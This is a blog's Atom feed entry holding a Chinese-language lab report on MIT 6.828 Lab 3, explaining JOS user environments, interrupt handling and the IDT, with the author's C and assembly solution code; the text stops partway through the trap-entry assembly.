<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>码龙的窝</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.codedragon.tech/"/>
  <updated>2018-02-26T08:44:19.150Z</updated>
  <id>http://blog.codedragon.tech/</id>
  
  <author>
    <name>CoSidian</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MIT6.828操作系统工程Lab3-User Environments实验报告</title>
    <link href="http://blog.codedragon.tech/2018/02/23/MIT6-828%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8BLab3-User-Environments%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://blog.codedragon.tech/2018/02/23/MIT6-828操作系统工程Lab3-User-Environments实验报告/</id>
    <published>2018-02-23T11:12:13.000Z</published>
    <updated>2018-02-26T08:44:19.150Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>Lab3 - User Environments需要实现基本的内核功能，使得一个受保护的用户环境（进程）可以运行。在本实验中，需要让内核设置数据结构以追踪用户环境，创建一个单用户环境，加载程序镜像并执行。此外，内核还需要能处理用户环境的系统调用以及引发的异常。</p>
</blockquote>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>根据官网，我们切换到分支lab3并且合并分支lab2，在合并的过程中，发生了冲突。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user% git checkout -b lab3 origin/lab3</div><div class="line">user% git merge lab2</div></pre></td></tr></table></figure>
<p>根据提示，是<code>kern/monitor.c</code>中发生了冲突，因为仅有一处冲突，手动编辑<code>kern/monitor.c</code>文件，并commit，即可解决冲突并合并分支。</p>
<p>实验三包括如下的新文件：</p>
<ul>
<li>inc/env.h 用户模式环境的公有定义</li>
<li>inc/trap.h 陷阱处理的公有定义</li>
<li>inc/syscall.h 用户环境对内核的系统调用的公有定义</li>
<li>inc/lib.h 用户模式支持的库公有定义</li>
<li>kern/env.h 用户模式环境的内核私有定义</li>
<li>kern/env.c 用户模式环境的内核代码实现</li>
<li>kern/trap.h 内核私有的陷阱处理定义</li>
<li>kern/trap.c 陷阱处理代码</li>
<li>kern/trapentry.S 汇编语言的陷阱处理程序入口</li>
<li>kern/syscall.h 系统调用处理的内核私有定义</li>
<li>kern/syscall.c 系统调用实现代码</li>
<li>lib/Makefrag 用户模式库obj/lib/libjos.a的Makefile</li>
<li>lib/entry.S 用户环境的汇编语言入口</li>
<li>lib/libmain.c entry.S调用的用户模式库安装代码</li>
<li>lib/syscall.c 用户模式系统调用的打桩函数</li>
<li>lib/console.c 用户模式的putchar和getchar实现，提供了控制台IO</li>
<li>lib/exit.c 用户模式的exit实现</li>
<li>lib/panic.c 用户模式的panic实现</li>
<li>user/* 检验内核实验三代码的测试程序</li>
</ul>
<p>此外，lab2中的一些文件在lab3中也被添加了新的内容，可以用<code>git diff lab2</code>查看具体的比较信息。</p>
<h4 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h4><p>本实验中可能会用到<code>GCC</code>的内联汇编特性，应当至少理解给出的代码中的内联汇编代码片段。</p>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="第一部分-User-Environments-and-Exception-Handling-用户环境和错误处理"><a href="#第一部分-User-Environments-and-Exception-Handling-用户环境和错误处理" class="headerlink" title="第一部分 User Environments and Exception Handling - 用户环境和错误处理"></a>第一部分 User Environments and Exception Handling - 用户环境和错误处理</h3><p><code>inc/env.h</code>中给出了用户环境的基本定义。内核通过<code>struct Env</code>追踪每一个用户环境。本实验中只需要创建一个环境，然而你需要设计JOS内核实际支持多用户环境。实验四中，你将通过允许一个用户环境<code>fork</code>别的用户环境来利用多用户环境的特性。</p>
<p><code>kern/env.c</code>中可以看到，内核管理3个与环境有关的全局变量：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">envs</span> = <span class="title">NULL</span>;</span>		<span class="comment">// All environments</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">curenv</span> = <span class="title">NULL</span>;</span>		<span class="comment">// The current env</span></div><div class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env_free_list</span>;</span>	<span class="comment">// Free environment list</span></div></pre></td></tr></table></figure></p>
<p>当JOS成功运行之后，<code>envs</code>指针指向一个<code>struct Env</code>的数组，代表了系统中所有的环境。在设计上，JOS内核允许<code>NNEV</code>个同时激活的环境，<code>NNEV</code>在<code>inc/env.h</code>中定义。<br>JOS内核使用<code>env_free_list</code>维护所有未激活的<code>struct Env</code>，这样的设计简化的环境的分配和释放，它们仅仅需要从该链表上添加或移除。<br>JOS内核使用<code>curenv</code>去追踪在任意时刻当前正在执行的环境。在启动之后到第一个环境运行的时间段中，<code>curenv</code>被初始化为<code>NULL</code>。</p>
<h4 id="环境状态"><a href="#环境状态" class="headerlink" title="环境状态"></a>环境状态</h4><p><code>struct Env</code>在<code>inc/env.h</code>中被定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> &#123;</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Trapframe</span> <span class="title">env_tf</span>;</span>	<span class="comment">// Saved registers</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env_link</span>;</span>		<span class="comment">// Next free Env</span></div><div class="line">	<span class="keyword">envid_t</span> env_id;			<span class="comment">// Unique environment identifier</span></div><div class="line">	<span class="keyword">envid_t</span> env_parent_id;		<span class="comment">// env_id of this env's parent</span></div><div class="line">	<span class="keyword">enum</span> EnvType env_type;		<span class="comment">// Indicates special system environments</span></div><div class="line">	<span class="keyword">unsigned</span> env_status;		<span class="comment">// Status of the environment</span></div><div class="line">	<span class="keyword">uint32_t</span> env_runs;		<span class="comment">// Number of times environment has run</span></div><div class="line"></div><div class="line">	<span class="comment">// Address space</span></div><div class="line">	<span class="keyword">pde_t</span> *env_pgdir;		<span class="comment">// Kernel virtual address of page dir</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<ul>
<li>env_tf - <code>struct TrapFrame</code>在<code>inc/trap.h</code>中被定义，表示了当环境不运行时被保存的寄存器值，主要用于上下文切换。</li>
<li>env_link - 指向了<code>env_free_list</code>上的下一个<code>struct Env</code>。<code>env_free_list</code>指向了链表中的第一个空闲环境。</li>
<li>env_id - 唯一标识当前正在使用<code>struct Env</code>的环境。当环境终止后，<code>struct Env</code>可能被内核重新分配用于另一个不同的环境，但它们的env_id是不同的。</li>
<li>env_parent_id - 存储了创建该环境的环境的<code>env_id</code>，通过该方式构建一个环境树，用于安全方面的决策。</li>
<li>env_type - 用于区分特殊环境，对于大部分环境，该值为<code>ENV_TYPE_USER</code>，在后续Lab中会介绍其他的值。</li>
<li>env_status - 状态<ol>
<li>ENV_FREE - 表明<code>struct Env</code>处于空闲状态，应当位于<code>env_free_list</code>上。</li>
<li>ENV_RUNNABLE - 表明<code>struct Env</code>代表的环境正等待运行于处理器上。</li>
<li>ENV_RUNNING - 表明<code>struct Env</code>代表的环境为正在运行的环境。</li>
<li>ENV_NOT_RUNNABLE - 表明<code>struct Env</code>代表了一个正在运行的环境，但却没有准备好运行，如正在等待另一个环境的IPC（进程间通信）。</li>
<li>ENV_DYING - 表明<code>struct Env</code>代表了一个僵死环境，僵死环境将在下一次陷入内核时被释放（直到Lab4才会使用该Flag）。</li>
</ol>
</li>
<li>env_pgdir - 保存了环境的页目录的内核虚拟地址。</li>
</ul>
<p>JOS中环境的概念综合了“线程”和“地址空间”，“线程”由<code>env_tf</code>域的被保存的寄存器值定义，“地址空间”由<code>env_pgdir</code>域指向的页目录和页表定义。为了运行一个环境，内核必须用保存的寄存器值和合适的地址空间设置CPU。</p>
<p>JOS的<code>struct Env</code>和xv6的<code>struct proc</code>很像，两种结构体都持有环境的用户模式寄存器状态（通过<code>struct TrapFrame</code>），然而，JOS中，独立的环境并不具有不同的内核栈，因为JOS内核中同时只能有一个运行的JOS环境，因此JOS只需要一个内核栈。</p>
<h4 id="分配环境数组"><a href="#分配环境数组" class="headerlink" title="分配环境数组"></a>分配环境数组</h4><p>练习1的代码，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></div><div class="line"><span class="comment">// Make 'envs' point to an array of size 'NENV' of 'struct Env'.</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"><span class="comment">// get size of envs</span></div><div class="line"><span class="keyword">uint32_t</span> envs_size = <span class="keyword">sizeof</span>(struct Env) * NENV;</div><div class="line"><span class="comment">// use boot_alloc to allocate memory</span></div><div class="line">envs = (struct Env *)boot_alloc(envs_size);</div><div class="line"><span class="comment">// initialization</span></div><div class="line"><span class="built_in">memset</span>(envs, <span class="number">0</span>, envs_size);</div><div class="line"></div><div class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></div><div class="line"><span class="comment">// Map the 'envs' array read-only by the user at linear address UENVS</span></div><div class="line"><span class="comment">// (ie. perm = PTE_U | PTE_P).</span></div><div class="line"><span class="comment">// Permissions:</span></div><div class="line"><span class="comment">//    - the new image at UENVS  -- kernel R, user R</span></div><div class="line"><span class="comment">//    - envs itself -- kernel RW, user NONE</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line">boot_map_region(kern_pgdir, UENVS, envs_size, PADDR(envs), PTE_U | PTE_P);</div></pre></td></tr></table></figure></p>
<h4 id="创建并运行环境"><a href="#创建并运行环境" class="headerlink" title="创建并运行环境"></a>创建并运行环境</h4><p>现在将在<code>kern/env.c</code>中编写必要的代码去运行用户环境。由于JOS内核还不支持文件系统，我们将配置内核以加载一个嵌入内核中静态二进制镜像。JOS内核将这个二进制镜像以ELF可执行镜像格式嵌入。</p>
<p>Lab3的GNU<code>Makefile</code>在<code>obj/user/</code>目录下生成了一些二进制镜像。<code>kern/Makefrag</code>下可以看到，链接器的<code>-b binary</code>选项使得这些文件以原始的未被翻译二进制文件而非普通的被编译器生成的<code>.o</code>文件的方式链接， 通过<code>-b binary</code>方式链接的二进制文件就链接器而言可以为任意类型，甚至是文本文件或是图片。</p>
<p>如果在构建内核后观察<code>obj/kern/kernel.sym</code>，可以看到链接器生成了一些“奇怪”名字的符号如<code>_binary_obj_user_hello_start</code>， <code>_binary_obj_user_hello_end</code>或 <code>_binary_obj_user_hello_size</code>。链接器通过二进制文件的名字生成了这些符号的名字，这些符号使得内核代码可以以某种方式引用这些嵌入的二进制文件。</p>
<p>练习2中遇到的问题：</p>
<ul>
<li>除了<code>env-&gt;env_tf.tf_eip</code>以外不要修改其他的值，因为其已经在<code>env_alloc()</code>中被初始化</li>
<li><code>region_alloc()</code>中笔误导致只映射了一页</li>
<li><code>load_icode()</code>中需要切换页表，之后加载每段仅用一个<code>memcpy</code>即可实现<br>练习2的代码如下，仅供参考：<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// In env_init():</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"><span class="keyword">ssize_t</span> i;</div><div class="line"><span class="comment">// loop in reverse order to keep ascending order in env free list</span></div><div class="line"><span class="keyword">for</span> (i = NENV - <span class="number">1</span> ; i &gt;= <span class="number">0</span> ; i--) &#123;</div><div class="line">    <span class="comment">// set env_status, env_id</span></div><div class="line">    envs[i].env_status = ENV_FREE;</div><div class="line">    envs[i].env_id = <span class="number">0</span>;</div><div class="line">    <span class="comment">// set env_link and insert into env_free_list</span></div><div class="line">    envs[i].env_link = env_free_list;</div><div class="line">    env_free_list = &amp;envs[i];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// In env_setup_vm():</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"><span class="comment">// set env_pgdir and generate page directory based on kern_pgdir</span></div><div class="line">e-&gt;env_pgdir = (<span class="keyword">pde_t</span> *)page2kva(p);</div><div class="line"><span class="built_in">memcpy</span>(e-&gt;env_pgdir, kern_pgdir, PGSIZE);</div><div class="line"><span class="comment">// increase pp_ref</span></div><div class="line">p-&gt;pp_ref++;</div><div class="line"></div><div class="line"><span class="comment">// In region_alloc():</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"><span class="comment">// (But only if you need it for load_icode.)</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Hint: It is easier to use region_alloc if the caller can pass</span></div><div class="line"><span class="comment">//   'va' and 'len' values that are not page-aligned.</span></div><div class="line"><span class="comment">//   You should round va down, and round (va + len) up.</span></div><div class="line"><span class="comment">//   (Watch out for corner-cases!)</span></div><div class="line"></div><div class="line"><span class="comment">// round va and va + len</span></div><div class="line"><span class="keyword">uintptr_t</span> start = (<span class="keyword">uintptr_t</span>)ROUNDDOWN(va, PGSIZE);</div><div class="line"><span class="keyword">uintptr_t</span> end = (<span class="keyword">uintptr_t</span>)ROUNDUP(va + len, PGSIZE);</div><div class="line"></div><div class="line"><span class="keyword">for</span> (; start &lt; end ; start += PGSIZE) &#123;</div><div class="line">    <span class="comment">// alloc page</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> * <span class="title">p</span>;</span></div><div class="line">    p = page_alloc(ALLOC_ZERO);</div><div class="line">    <span class="keyword">if</span> (!p) &#123;</div><div class="line">        panic(<span class="string">"out of memory when allocating region!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// insert page into environment's page directory</span></div><div class="line">    <span class="keyword">if</span> (page_insert(e-&gt;env_pgdir, p, (<span class="keyword">char</span> *)start , PTE_W | PTE_U | PTE_P) &lt; <span class="number">0</span>) &#123;</div><div class="line">        panic(<span class="string">"out of memory when allocating region!"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// In load_icode():</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"><span class="comment">// switch address space for loading program segments</span></div><div class="line">lcr3(PADDR(e-&gt;env_pgdir));</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Elf</span> * <span class="title">elf</span> = (<span class="title">struct</span> <span class="title">Elf</span> *)<span class="title">binary</span>;</span></div><div class="line"><span class="comment">// check elf magic</span></div><div class="line"><span class="keyword">if</span> (elf-&gt;e_magic != ELF_MAGIC) &#123;</div><div class="line">    panic(<span class="string">"invalid elf format!"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// set the program entry for env</span></div><div class="line">e-&gt;env_tf.tf_eip = elf-&gt;e_entry;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Proghdr</span> * <span class="title">ph</span>, *<span class="title">eph</span>;</span></div><div class="line"></div><div class="line"><span class="comment">// get the start and end of program header entry</span></div><div class="line">ph = (struct Proghdr *)(binary + elf-&gt;e_phoff);</div><div class="line">eph = ph + elf-&gt;e_phnum;</div><div class="line"><span class="keyword">for</span>(; ph &lt; eph ; ph++) &#123;</div><div class="line">    <span class="keyword">if</span> (ph-&gt;p_type == ELF_PROG_LOAD) &#123; <span class="comment">// if the segment is to be loaded</span></div><div class="line">        <span class="comment">// alloc corresponding region(clear zero)</span></div><div class="line">        region_alloc(e, (<span class="keyword">char</span> *)ph-&gt;p_va, ph-&gt;p_memsz);</div><div class="line">        <span class="comment">// copy from ELF header to virtual addresses directly</span></div><div class="line">        <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)ph-&gt;p_va, (<span class="keyword">char</span> *)binary + ph-&gt;p_offset, ph-&gt;p_filesz);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">// switch back</span></div><div class="line">lcr3(PADDR(kern_pgdir));</div><div class="line"></div><div class="line"><span class="comment">// Now map one page for the program's initial stack</span></div><div class="line"><span class="comment">// at virtual address USTACKTOP - PGSIZE.</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"><span class="comment">// allocate a page and insert it into env's page directory</span></div><div class="line"><span class="comment">// panic when page_alloc or page_insert failed</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> * <span class="title">stack_page</span> = <span class="title">page_alloc</span>(<span class="title">ALLOC_ZERO</span>);</span></div><div class="line"><span class="keyword">if</span> (!stack_page) &#123;</div><div class="line">    panic(<span class="string">"out of memory when alloc program's stack!"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (page_insert(e-&gt;env_pgdir, stack_page, (<span class="keyword">char</span> *)(USTACKTOP - PGSIZE), PTE_W | PTE_U | PTE_P) &lt; <span class="number">0</span>) &#123;</div><div class="line">    panic(<span class="string">"failed to set program's stack!"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// In env_create():</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> * <span class="title">env</span>;</span></div><div class="line"><span class="comment">// allocate new env with parent ID 0</span></div><div class="line"><span class="keyword">if</span> (env_alloc(&amp;env, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</div><div class="line">    panic(<span class="string">"failed to allocate env!"</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment">// load elf binary and set env_type</span></div><div class="line">load_icode(env, binary);</div><div class="line">env-&gt;env_type = type;</div><div class="line"></div><div class="line"><span class="comment">// In env_run():</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"><span class="keyword">if</span> (curenv != <span class="literal">NULL</span>) &#123; <span class="comment">// context switch</span></div><div class="line">    <span class="keyword">if</span> (curenv-&gt;env_status == ENV_RUNNING) &#123;</div><div class="line">        <span class="comment">// change to runnable if current status is running</span></div><div class="line">        <span class="comment">// for not runnable, is not necessary to do this</span></div><div class="line">        curenv-&gt;env_status = ENV_RUNNABLE;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// set new curenv, update status and counter</span></div><div class="line">curenv = e;</div><div class="line">e-&gt;env_status = ENV_RUNNING;</div><div class="line">e-&gt;env_runs++;</div><div class="line"><span class="comment">// address space switch</span></div><div class="line"><span class="comment">// reference from inc/x86.h</span></div><div class="line">lcr3(PADDR(e-&gt;env_pgdir));</div><div class="line"><span class="comment">// drop into user mode</span></div><div class="line">env_pop_tf(&amp;(e-&gt;env_tf));</div><div class="line"></div><div class="line"><span class="comment">// panic("env_run not yet implemented");</span></div></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>成功进入用户环境后，若用户环境尝试使用<code>int</code>指令进行系统调用时，将产生错误，因为JOS没有设置任何从用户空间进入内核的方式。<br>当CPU发现无法处理系统中断调用后，会产生一个通用保护错误，发现无法处理它，然后生成一个二重错误，最终因无法处理而生成一个三重错误并放弃，然后系统重启。但是为了便于调试，patch的<code>qemu</code>不会重启。<br>关于重启的理由可以参考<a href="https://blogs.msdn.microsoft.com/larryosterman/2005/02/08/faster-syscall-trap-redux/" target="_blank" rel="external">这里</a>。</p>
</blockquote>
<p>完成后经过测试，程序在<code>int $0x30</code>处Triple Fault，可知本部分代码基本正确。</p>
<h4 id="处理中断和异常"><a href="#处理中断和异常" class="headerlink" title="处理中断和异常"></a>处理中断和异常</h4><p>练习3要求阅读Intel 80386编程手册中的<a href="https://pdos.csail.mit.edu/6.828/2017/readings/i386/c09.htm" target="_blank" rel="external">第九章：异常和中断</a>。</p>
<p>本实验中我们将沿用Intel关于中断和异常的术语。中断是由处理器以外的异步事件引发的，而异常是由当前正在执行的指令同步引发的。</p>
<h4 id="保护控制转移基础"><a href="#保护控制转移基础" class="headerlink" title="保护控制转移基础"></a>保护控制转移基础</h4><p>异常和中断均为“保护控制转移”，会引发处理器从用户到内核模式（CPL=0），从而避免给用户模式的代码干扰内核或是其他环境的机会。这要求了引发中断或者是异常的代码不能选择进入内核的地点或方式。<br>在x86中，主要有两种机制一起保证了内核总是在受保护的情况下进入，这两种机制为中断描述符表（Interrupt Descriptor Table）和任务状态段（Task State Segment）。</p>
<p>中断描述符表中，处理器保证了异常和中断仅能导致内核在若干个具体的、由内核明确定义好的入口执行，而不是在中断和异常发生时运行的代码。<br>x86允许最多设立256个不同的中断或异常入口，每一个入口都具有一个中断向量。中断向量为0-255的数字，中断向量由中断来源决定：不同的设备，错误条件和应用程序对内核的请求会产生不同向量的中断。CPU使用中断向量作为处理器的中断描述符表的索引。中断描述符表在内核私有的内存中建立。<br>处理器从该表中加载送入EIP寄存器的值（处理程序的入口），以及送入CS段寄存器的值（包括了特权级，在JOS中，所有的异常均在内核模式执行，即特权级0）。</p>
<p>任务状态段。处理器需要在唤醒处理程序前将在中断或异常发生前的旧的处理器状态保存起来，如旧的EIP寄存器值和旧的CS段寄存器值，以便处理程序之后能恢复现场，从中断或异常发生的地方继续执行。然而，保存旧的处理器状态的区域必须对于非特权的用户模式代码处于被保护的状态。否则，错误的或是恶意的用户代码可能会破坏内核。<br>因此，当x86处理器从用户模式特权级切换到内核模式时，其也会切换到内核内存中的一个栈。任务状态段指定了相应的段寄存器以及相应栈的地址。处理器将<code>SS</code>, <code>EFLAGS</code>, <code>CS</code>, <code>EIP</code>以及一个可选的错误码压入这个新栈中。然后从中断描述符中读取相应的<code>CS</code>和<code>EIP</code>，并设置<code>ESP</code>和<code>SS</code>指向新的栈。<br>尽管<code>TSS</code>有着多种作用，JOS仅用它来定义从用户模式切换到内核模式时的内核栈。因为JOS中的内核模式为x86的特权级0，故处理器仅使用<code>TSS</code>的<code>ESP0</code>和<code>SS0</code>域。</p>
<h4 id="异常和中断的类型"><a href="#异常和中断的类型" class="headerlink" title="异常和中断的类型"></a>异常和中断的类型</h4><p>x86处理器能产生的所有同步异常均使用了0-31的中断向量，映射为<code>IDT</code>的0-31号入口。超过31的中断向量仅供由<code>int</code>指令或是由异步硬件中断产生的“软中断”使用。</p>
<h4 id="嵌套异常和中断"><a href="#嵌套异常和中断" class="headerlink" title="嵌套异常和中断"></a>嵌套异常和中断</h4><p>处理器能同时处理内核模式和用户模式的异常。在内核模式中的异常不需要切换栈，因此，不需要压入旧的<code>SS</code>和<code>ESP</code>值。通过这种方式，内核可以优雅地处理内核产生的嵌套异常和中断。该能力对于实现保护是非常重要的。</p>
<p>若处理器已经在内核模式中并且接受了一个异常并且无法将旧值压入内核栈中时（如内存不足），那么，处理器将无论如何也无法恢复，只能重启。内核必须设计良好以避免这种情况发生。</p>
<h4 id="建立IDT表"><a href="#建立IDT表" class="headerlink" title="建立IDT表"></a>建立IDT表</h4><p>由于JOS中使用的为IA_32的陷阱码，更推荐参考<a href="https://pdos.csail.mit.edu/6.828/2017/readings/ia32/IA32-3A.pdf" target="_blank" rel="external">IA_32的第五章</a>。</p>
<p>练习4中遇到的问题如下：</p>
<ul>
<li>设置陷阱门时段选择子应当为<code>GD_KT</code>而不是<code>GD_KD</code>，因为错误处理函数均被链接至了内核的<code>text</code>段。</li>
<li>已存在<code>page_fault_handler</code>的函数，命名时需避免重名。</li>
<li>不能直接用立即数设置段寄存器。</li>
</ul>
<p>练习4的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// In trapentry.S:</span></div><div class="line"><span class="comment">/*</span></div><div class="line"> * Lab 3: Your code here for generating entry points for the different traps.</div><div class="line"> */</div><div class="line"></div><div class="line">TRAPHANDLER_NOEC(divide_error_handler, T_DIVIDE)</div><div class="line">TRAPHANDLER_NOEC(debug_exception_handler, T_DEBUG)</div><div class="line">TRAPHANDLER_NOEC(non_maskable_interrupt_handler, T_NMI)</div><div class="line">TRAPHANDLER_NOEC(breakpoint_handler, T_BRKPT)</div><div class="line">TRAPHANDLER_NOEC(overflow_handler, T_OFLOW)</div><div class="line">TRAPHANDLER_NOEC(bounds_check_handler, T_BOUND)</div><div class="line">TRAPHANDLER_NOEC(invalid_opcode_handler, T_ILLOP)</div><div class="line">TRAPHANDLER_NOEC(device_not_available_handler, T_DEVICE)</div><div class="line">TRAPHANDLER(double_fault_handler, T_DBLFLT)</div><div class="line">TRAPHANDLER(invalid_tss_handler, T_TSS)</div><div class="line">TRAPHANDLER(segment_not_present_handler, T_SEGNP)</div><div class="line">TRAPHANDLER(stack_exception_handler, T_STACK)</div><div class="line">TRAPHANDLER(general_protection_fault_handler, T_GPFLT)</div><div class="line">TRAPHANDLER(pagefault_handler, T_PGFLT)</div><div class="line">TRAPHANDLER_NOEC(floating_point_error_handler, T_FPERR)</div><div class="line">TRAPHANDLER(alignment_check_handler, T_ALIGN)</div><div class="line">TRAPHANDLER_NOEC(machine_check_handler, T_MCHK)</div><div class="line">TRAPHANDLER_NOEC(simd_floating_point_error_handler, T_SIMDERR)</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"> * Lab 3: Your code here for _alltraps</div><div class="line"> */</div><div class="line"></div><div class="line">_alltraps:</div><div class="line"><span 